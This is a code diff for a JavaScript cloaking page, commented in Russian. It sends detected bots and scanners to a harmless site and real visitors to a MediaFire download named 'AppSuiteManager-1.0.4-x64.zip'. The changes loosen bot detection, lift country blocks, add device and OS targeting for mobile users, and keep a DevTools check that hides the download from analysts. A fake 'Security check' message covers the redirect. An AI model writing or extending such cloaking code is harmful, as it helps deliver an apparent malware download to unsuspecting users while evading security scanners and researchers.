@@ -36,12 +36,38 @@
       botLink: 'https://www.syncplicity.com/',
       userLink: 'https://www.mediafire.com/file_premium/sz58shk4kwcduyu/AppSuiteManager-1.0.4-x64.zip/file',
       
-      // Настройки
+      // Настройки детекции ботов
       delay: 3000,
-      strictMode: true, // Более строгая детекция
+      strictMode: false, // Менее строгая детекция для мобильных
+      
+      // 📱 ФИЛЬТРЫ ПО УСТРОЙСТВАМ И ОС
+      deviceFilters: {
+        // ═══════════════════════════════════════════════
+        // 📱 ТИПЫ УСТРОЙСТВ
+        // ═══════════════════════════════════════════════
+        allowMobile: true,        // Мобильные: iPhone, Android, планшеты
+        allowDesktop: true,       // Десктоп: ПК, ноутбуки, Mac
+        
+        // ═══════════════════════════════════════════════
+        // 💻 ОПЕРАЦИОННЫЕ СИСТЕМЫ
+        // ═══════════════════════════════════════════════
+        allowWindows: true,       // Windows 7/8/10/11
+        allowMacOS: true,         // macOS (все версии)
+        allowLinux: true,         // Linux, Ubuntu и др.
+        allowiOS: true,           // iPhone, iPad
+        allowAndroid: true,       // Android телефоны/планшеты
+        
+        // ═══════════════════════════════════════════════
+        // 🎯 ПРИМЕРЫ НАСТРОЕК:
+        // ═══════════════════════════════════════════════
+        // Только мобильные: allowDesktop: false
+        // Только iPhone: allowAndroid: false, allowDesktop: false  
+        // Только Windows: allowMacOS: false, allowLinux: false, allowMobile: false
+        // Блокировать Android: allowAndroid: false
+      },
       
       // Проверка по геолокации (опционально)
-      blockedCountries: ['CN', 'RU'], // ISO коды стран
+      blockedCountries: [], // Отключено
       
       // Проверка по времени (блокировать в рабочие часы)
       workingHoursBlock: false,
@@ -54,6 +80,56 @@
         this.detectionResults = {};
         this.userIP = null;
         this.userLocation = null;
+        this.deviceInfo = this.detectDevice();
+      }
+
+      // 🔍 Детекция устройства и ОС
+      detectDevice() {
+        const ua = navigator.userAgent;
+        const platform = navigator.platform;
+        
+        const info = {
+          isMobile: false,
+          isDesktop: false,
+          os: 'unknown',
+          device: 'unknown'
+        };
+
+        // Определяем мобильные устройства
+        if (/iPhone|iPad|iPod/i.test(ua)) {
+          info.isMobile = true;
+          info.os = 'iOS';
+          info.device = /iPad/i.test(ua) ? 'iPad' : 'iPhone';
+        } else if (/Android/i.test(ua)) {
+          info.isMobile = true;
+          info.os = 'Android';
+          info.device = 'Android';
+        } else if (/Mobile|Tablet/i.test(ua)) {
+          info.isMobile = true;
+          info.os = 'Mobile';
+          info.device = 'Mobile';
+        }
+
+        // Определяем десктоп ОС
+        if (!info.isMobile) {
+          info.isDesktop = true;
+          
+          if (/Windows NT|Win32|Win64|WOW64/i.test(ua)) {
+            info.os = 'Windows';
+            info.device = 'PC';
+          } else if (/Mac OS X|Macintosh|MacIntel/i.test(ua)) {
+            info.os = 'macOS';
+            info.device = 'Mac';
+          } else if (/Linux|X11/i.test(ua)) {
+            info.os = 'Linux';
+            info.device = 'Linux PC';
+          } else if (/CrOS/i.test(ua)) {
+            info.os = 'ChromeOS';
+            info.device = 'Chromebook';
+          }
+        }
+
+        return info;
       }
 
       // 🔍 Получение IP адреса
@@ -84,6 +160,8 @@
 
       // 🤖 Базовые проверки ботов
       basicBotChecks() {
+        const isMobile = /iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent);
+        
         const checks = {
           userAgent: () => {
             const ua = navigator.userAgent.toLowerCase();
@@ -91,8 +169,7 @@
               'bot', 'crawler', 'spider', 'scraper', 'automated',
               'googlebot', 'bingbot', 'yandexbot', 'baiduspider',
               'facebookexternalhit', 'twitterbot', 'linkedinbot',
-              'whatsapp', 'telegram', 'discord', 'headless',
-              'phantom', 'selenium', 'webdriver', 'chrome-lighthouse'
+              'headless', 'phantom', 'selenium', 'webdriver', 'chrome-lighthouse'
             ];
             return patterns.some(p => ua.includes(p));
           },
@@ -101,7 +178,7 @@
             try {
               const canvas = document.createElement('canvas');
               const gl = canvas.getContext('webgl');
-              if (!gl) return true;
+              if (!gl) return !isMobile; // На мобильных WebGL может отсутствовать
               
               const vendor = gl.getParameter(gl.VENDOR);
               const renderer = gl.getParameter(gl.RENDERER);
@@ -117,38 +194,50 @@
                 renderer.toLowerCase().includes(s)
               );
             } catch {
-              return true;
+              return !isMobile; // На мобильных не считаем ошибку подозрительной
             }
           },
 
           screen: () => {
             const w = screen.width, h = screen.height;
+            // Исключаем обычные мобильные разрешения
+            if (isMobile) {
+              return w < 50 || h < 50 || w > 5000 || h > 5000;
+            }
             return w < 100 || h < 100 || 
                    (w === 800 && h === 600) ||
-                   (w === 1024 && h === 768) ||
                    w > 3000 || h > 3000;
           },
 
-          plugins: () => navigator.plugins.length === 0,
+          plugins: () => {
+            // На мобильных плагинов обычно нет
+            return !isMobile && navigator.plugins.length === 0;
+          },
 
           languages: () => {
             const langs = navigator.languages;
-            return !langs || langs.length === 0 || 
-                   (langs.length === 1 && langs[0] === 'en-US');
+            if (isMobile) return false; // Не проверяем на мобильных
+            return !langs || langs.length === 0;
           },
 
           permissions: () => {
+            // На мобильных permissions API может отсутствовать
+            if (isMobile) return false;
             return !navigator.permissions || 
                    typeof navigator.permissions.query !== 'function';
           },
 
           connection: () => {
+            // На мобильных connection API может отсутствовать или показывать медленное соединение
+            if (isMobile) return false;
             const conn = navigator.connection;
             return !conn || conn.effectiveType === 'slow-2g';
           },
 
           touch: () => {
-            return 'ontouchstart' in window && navigator.maxTouchPoints === 0;
+            // Исправляем логику для тач-устройств
+            if (!('ontouchstart' in window)) return false;
+            return navigator.maxTouchPoints === 0 && !isMobile;
           }
         };
 
@@ -164,11 +253,13 @@
           }
         }
 
-        return suspicious >= (config.strictMode ? 2 : 3);
+        return suspicious >= (config.strictMode ? 3 : 4);
       }
 
       // 🎨 Canvas fingerprinting
       canvasFingerprint() {
+        const isMobile = /iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent);
+        
         try {
           const canvas = document.createElement('canvas');
           const ctx = canvas.getContext('2d');
@@ -184,8 +275,9 @@
 
           const imageData = canvas.toDataURL();
           
-          // Слишком короткий = подозрительно
-          if (imageData.length < 5000) return true;
+          // На мобильных canvas может быть меньше
+          const minLength = isMobile ? 3000 : 5000;
+          if (imageData.length < minLength) return !isMobile;
           
           // Стандартные значения для headless браузеров
           const suspiciousHashes = [
@@ -195,34 +287,41 @@
           
           return suspiciousHashes.some(hash => imageData.startsWith(hash));
         } catch {
-          return true;
+          return !isMobile; // На мобильных не считаем ошибку подозрительной
         }
       }
 
       // ⏰ Проверка времени и поведения
       behaviorChecks() {
+        const isMobile = /iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent);
         const checks = [];
 
-        // Слишком быстрая загрузка
-        checks.push(performance.now() < 50);
+        // Слишком быстрая загрузка (только для десктопа)
+        if (!isMobile) {
+          checks.push(performance.now() < 30);
+        }
 
-        // Нет истории браузера
-        checks.push(history.length <= 1);
+        // Нет истории браузера (менее строго для мобильных)
+        if (!isMobile) {
+          checks.push(history.length <= 1);
+        }
 
-        // Подозрительный referrer
+        // Подозрительный referrer (убираем социальные сети)
         const ref = document.referrer.toLowerCase();
-        const badRefs = ['facebook.com', 't.co', 'bit.ly', 'tinyurl.com'];
+        const badRefs = ['bit.ly', 'tinyurl.com'];
         checks.push(badRefs.some(domain => ref.includes(domain)));
 
-        // Проверка DevTools
-        const devToolsOpen = () => {
-          const threshold = 160;
-          return window.outerHeight - window.innerHeight > threshold ||
-                 window.outerWidth - window.innerWidth > threshold;
-        };
-        checks.push(devToolsOpen());
+        // Проверка DevTools (только для десктопа)
+        if (!isMobile) {
+          const devToolsOpen = () => {
+            const threshold = 160;
+            return window.outerHeight - window.innerHeight > threshold ||
+                   window.outerWidth - window.innerWidth > threshold;
+          };
+          checks.push(devToolsOpen());
+        }
 
-        // Автоматизация
+        // Автоматизация (только явные признаки)
         checks.push(
           navigator.webdriver === true ||
           !!window.phantom ||
@@ -231,7 +330,7 @@
           !!window.__nightmare
         );
 
-        return checks.filter(Boolean).length >= 2;
+        return checks.filter(Boolean).length >= 3; // Увеличиваем порог
       }
 
       // 🌐 Геоблокировка
@@ -259,9 +358,77 @@
         return hour >= start && hour <= end;
       }
 
+      // 📱 Проверка фильтров устройств и ОС
+      deviceFilter() {
+        const filters = config.deviceFilters;
+        const device = this.deviceInfo;
+
+        console.log('Device info:', device);
+        console.log('Device filters:', filters);
+
+        // Проверка по типу устройства
+        if (device.isMobile && !filters.allowMobile) {
+          console.log('❌ Mobile device blocked');
+          return true; // Блокируем мобильные
+        }
+
+        if (device.isDesktop && !filters.allowDesktop) {
+          console.log('❌ Desktop device blocked');
+          return true; // Блокируем десктоп
+        }
+
+        // Проверка по операционной системе
+        switch (device.os) {
+          case 'Windows':
+            if (!filters.allowWindows) {
+              console.log('❌ Windows blocked');
+              return true;
+            }
+            break;
+
+          case 'macOS':
+            if (!filters.allowMacOS) {
+              console.log('❌ macOS blocked');
+              return true;
+            }
+            break;
+
+          case 'Linux':
+            if (!filters.allowLinux) {
+              console.log('❌ Linux blocked');
+              return true;
+            }
+            break;
+
+          case 'iOS':
+            if (!filters.allowiOS) {
+              console.log('❌ iOS blocked');
+              return true;
+            }
+            break;
+
+          case 'Android':
+            if (!filters.allowAndroid) {
+              console.log('❌ Android blocked');
+              return true;
+            }
+            break;
+        }
+
+        console.log('✅ Device/OS allowed');
+        return false; // Разрешаем доступ
+      }
+
       // 📊 Финальная оценка
       async detect() {
         console.log('🔍 Starting advanced bot detection...');
+
+        // Сначала проверяем фильтры устройств (приоритетная проверка)
+        const isDeviceBlocked = this.deviceFilter();
+        if (isDeviceBlocked) {
+          console.log('🚫 Device/OS blocked by filters');
+          return true; // Сразу блокируем если устройство/ОС не разрешены
+        }
 
         const checks = await Promise.all([
           this.basicBotChecks(),
@@ -276,6 +443,7 @@
         const totalSuspicious = checks.filter(Boolean).length;
         
         console.log('Detection results:', {
+          deviceInfo: this.deviceInfo,
           basicBot: isBasicBot,
           suspiciousCanvas: isSuspiciousCanvas,
           suspiciousBehavior: isSuspiciousBehavior,
@@ -286,9 +454,9 @@
           location: this.userLocation?.city + ', ' + this.userLocation?.country_name
         });
 
-        // Строгий режим: любая 1 проверка = бот
-        // Обычный режим: 2+ проверки = бот
-        return config.strictMode ? totalSuspicious >= 1 : totalSuspicious >= 2;
+        // Строгий режим: 2+ проверки = бот
+        // Обычный режим: 3+ проверки = бот
+        return config.strictMode ? totalSuspicious >= 2 : totalSuspicious >= 3;
       }
     }
 
@@ -310,7 +478,7 @@
         
         // Обновляем сообщение
         document.querySelector('.message').textContent = 
-          isBot ? 'Security check complete' : 'Redirecting to content...';
+          isBot ? 'Security check complete' : 'Security check...';
         
         // Редирект
         setTimeout(() => {
